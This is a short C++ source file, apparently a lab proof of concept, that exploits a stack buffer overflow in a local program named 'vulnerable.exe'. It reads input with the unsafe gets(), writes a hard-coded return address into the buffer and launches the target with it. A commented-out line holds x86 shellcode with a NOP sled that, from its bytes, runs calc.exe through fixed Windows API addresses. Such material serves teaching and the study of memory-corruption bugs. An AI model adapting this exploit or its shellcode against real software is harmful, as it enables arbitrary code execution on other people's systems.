// exploit.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include<cstdlib>
#include<cstring>
#include<process.h>
#include<iostream>

using namespace std;

int get_ebp()
{
	__asm mov eax, [ebp]
}

int get_esp()
{
	__asm mov eax, [esp]
}

int main(int argc, char *argv[])
{
	//int bufferSize = 200;
	//if(argc > 1)
	//{
	//	bufferSize = atoi(argv[1]);
	//}
	
	//char *buffer = new char[bufferSize];
	//for(int i = 0; i < bufferSize; i++)
	//{
	//	buffer[i] = 'A';
	//}
	//buffer[bufferSize-1] = '\0';

	//char buffer[] = "\x90\x90\x90\x90\x90\x90\x90\x81\xc4\x11\xff\xff\xff\x81\xec\x69\xff\xff\xff\xeb\x16\x5b\x31\xc0\x50\x53\xbb\x0d\x25\x86\x7c\xff\xd3\x31\xc0\x50\xbb\x12\xcb\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x61\x6c\x63\x2e\x65\x78\x65\x90\x90\x90\x90\x90\x90\x90\x90\x90\x00";
	//strncpy(buffer, argv[2], sizeof(buffer));

	char buffer[100];
	gets(buffer); //Size is 57 right now

	//int i = 57;
	//for(i; i < 68; i++)
	//{
	//	buffer[i] = '\x90';
	//}
	//buffer[i] = '\x3c';
	//buffer[i+1] = '\xff';
	//buffer[i+2] = '\x12';
	//buffer[i+3] = '\x00';

	buffer[68] = '\x3c';
	buffer[69] = '\xff';
	buffer[70] = '\x12';
	buffer[71] = '\x00';
	
	char *callVulnerable[3];
	callVulnerable[0] = "../../vulnerable/Release/vulnerable.exe";
	callVulnerable[1] = buffer;
	callVulnerable[2] = NULL;

	cout << "Ready to exploit..." << endl;

	_execve(callVulnerable[0], callVulnerable, NULL);

	cout << "Exploit complete..." << endl;

	//delete buffer;

	return 0;
}

